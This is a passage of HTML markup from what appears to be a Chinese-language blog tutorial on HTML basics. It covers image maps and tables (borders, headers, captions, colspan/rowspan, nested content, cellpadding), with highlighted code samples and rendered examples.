class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/planets.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">ismap</span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></code></pre><p>如果点击 (12,34)，则会访问<code>/html_ismap.html?12,34</code>.</p><br><h2 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h2><p>每个表格由 <code>table</code> 标签开始。每个表格行由 <code>tr</code> 标签 (table row) 开始。每个表格数据由 <code>td</code> 标签 (table data) 开始，即数据单元格的内容。</p><p>数据单元格可以包含文本、图片、列表、段落、表单、水平线、表格等等。</p><p><em>（这里在博客上可能很多显示不正常，因为另外有CSS样式对全局表格进行了定义</em></p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>row 1, cell 1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>row 1, cell 2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>row 2, cell 1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>row 2, cell 2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></code></pre><table>    <tbody><tr>        <td>row 1, cell 1</td>        <td>row 1, cell 2</td>    </tr>    <tr>        <td>row 2, cell 1</td>        <td>row 2, cell 2</td>    </tr></tbody></table><h3 id="边框"><a href="#边框" class="headerlink" title="边框"></a>边框</h3><p>border属性</p><p>上面的例子没有边框，或者设置<code>&lt;table border="0"&gt;</code>。</p><p>带有普通的边框：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>First<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>Row<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>Second<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>Row<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></code></pre><table border="1">    <tbody><tr>        <td>First</td>        <td>Row</td>    </tr>       <tr>        <td>Second</td>        <td>Row</td>    </tr></tbody></table><p>粗的边框（增大<code>border</code>）：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre><table border="10">    <tbody><tr>        <td>First</td>        <td>Row</td>    </tr>       <tr>        <td>Second</td>        <td>Row</td>    </tr></tbody></table><h3 id="表头"><a href="#表头" class="headerlink" title="表头"></a>表头</h3><p><code>th</code>标签</p><p>大多数浏览器会把表头显示为粗体居中的文本</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>Heading<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>Another Heading<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>row 1, cell 1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>row 1, cell 2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>row 2, cell 1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>row 2, cell 2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></code></pre><table border="1">    <tbody><tr>        <th>Heading</th>        <th>Another Heading</th>    </tr>    <tr>        <td>row 1, cell 1</td>        <td>row 1, cell 2</td>    </tr>    <tr>        <td>row 2, cell 1</td>        <td>row 2, cell 2</td>    </tr></tbody></table><p>下面是垂直的表头：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>姓名<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>Miao<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>电话<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>123456<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>电话<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>654321<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></code></pre><table border="1">    <tbody><tr>        <th>姓名</th>        <td>Miao</td>    </tr>    <tr>        <th>电话</th>        <td>123456</td>    </tr>    <tr>        <th>电话</th>        <td>654321</td>    </tr></tbody></table><h3 id="空单元格"><a href="#空单元格" class="headerlink" title="空单元格"></a>空单元格</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>row 1, cell 1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>row 1, cell 2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>row 2, cell 2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></code></pre><table border="1"><tbody><tr><td>row 1, cell 1</td><td>row 1, cell 2</td></tr><tr><td></td><td>row 2, cell 2</td></tr></tbody></table><p>这个空的单元格的边框可能没有被显示出来。为了避免这种情况，在空单元格中添加一个空格占位符（<code>&amp;nbsp;</code>)，就可以将边框显示出来。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>row 1, cell 1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>row 1, cell 2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token entity" title="&nbsp;">&amp;nbsp;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>row 2, cell 2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></code></pre><table border="1">    <tbody><tr>        <td>row 1, cell 1</td>        <td>row 1, cell 2</td>    </tr>    <tr>        <td>&nbsp;</td>        <td>row 2, cell 2</td>    </tr></tbody></table><h3 id="表的标题"><a href="#表的标题" class="headerlink" title="表的标题"></a>表的标题</h3><p><code>caption</code>标签</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>6<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>caption</span><span class="token punctuation">></span></span>这是标题<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>caption</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>100<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>200<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>300<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>400<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>500<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>600<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></code></pre><table border="6">    <caption>这是标题</caption>    <tbody><tr>        <td>100</td>        <td>200</td>        <td>300</td>    </tr>    <tr>        <td>400</td>        <td>500</td>        <td>600</td>    </tr></tbody></table><h3 id="单元格跨行跨列"><a href="#单元格跨行跨列" class="headerlink" title="单元格跨行跨列"></a>单元格跨行跨列</h3><p><strong>横跨列：</strong><code>colspan</code>属性</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>姓名<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span> <span class="token attr-name">colspan</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>电话<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>Miao<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>123456<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>654321<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></code></pre><table border="1"><tbody><tr>  <th>姓名</th>  <th colspan="2">电话</th></tr><tr>  <td>Miao</td>  <td>123456</td>  <td>654321</td></tr></tbody></table><p><strong>横跨行：</strong><code>rowspan</code>属性</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>姓名<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>Miao<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span> <span class="token attr-name">rowspan</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>电话<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>123456<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>654321<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></code></pre><table border="1"><tbody><tr>  <th>姓名</th>  <td>Miao</td></tr><tr>  <th rowspan="2">电话</th>  <td>123456</td></tr><tr>  <td>654321</td></tr></tbody></table><h3 id="表格内标签"><a href="#表格内标签" class="headerlink" title="表格内标签"></a>表格内标签</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>这是一个段落。<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>这是另一个段落。<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>这个单元包含一个表格：   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>A<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>B<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>C<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>D<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>这个单元包含一个列表：   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>苹果<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>香蕉<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>菠萝<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>一张图片：      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>FrontEnd_HTML_Basic/html5.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>HTML5<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></code></pre><table border="1"><tbody><tr>  <td>   <p>这是一个段落。</p>   <p>这是另一个段落。</p>  </td>  <td>这个单元包含一个表格：   <table border="1">   <tbody><tr>     <td>A</td>     <td>B</td>   </tr>   <tr>     <td>C</td>     <td>D</td>   </tr>   </tbody></table>  </td></tr><tr>  <td>这个单元包含一个列表：   <ul>    <li>苹果</li>    <li>香蕉</li>    <li>菠萝</li>   </ul>  </td>  <td>一张图片：      <img src="/2020/02/14/FrontEnd_HTML_Basic/html5.jpg" alt="HTML5">  </td></tr></tbody></table><h3 id="单元格边距"><a href="#单元格边距" class="headerlink" title="单元格边距"></a>单元格边距</h3><p>Cellpadding 单元格内容与其边框之间的空白。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span> <span class="token attr-name">cellpadding</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>20<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>First<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>Row<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>Second<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>Row<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></code></pre><table border="1" cellpadding="20"><tbody><tr>  <td>First</td>  <td>Row</td></tr>   <tr>  <td>Second</td>  <td>Row</td></tr></tbody></table><h3 id="单元格间距"><a href="#单元格间距" class="headerlink" title="单元格间距"></a>单元格间距</h3><p>cellspacing 增加单元格之间的距离。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span> <span class="token attr-name">cellspacing</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token 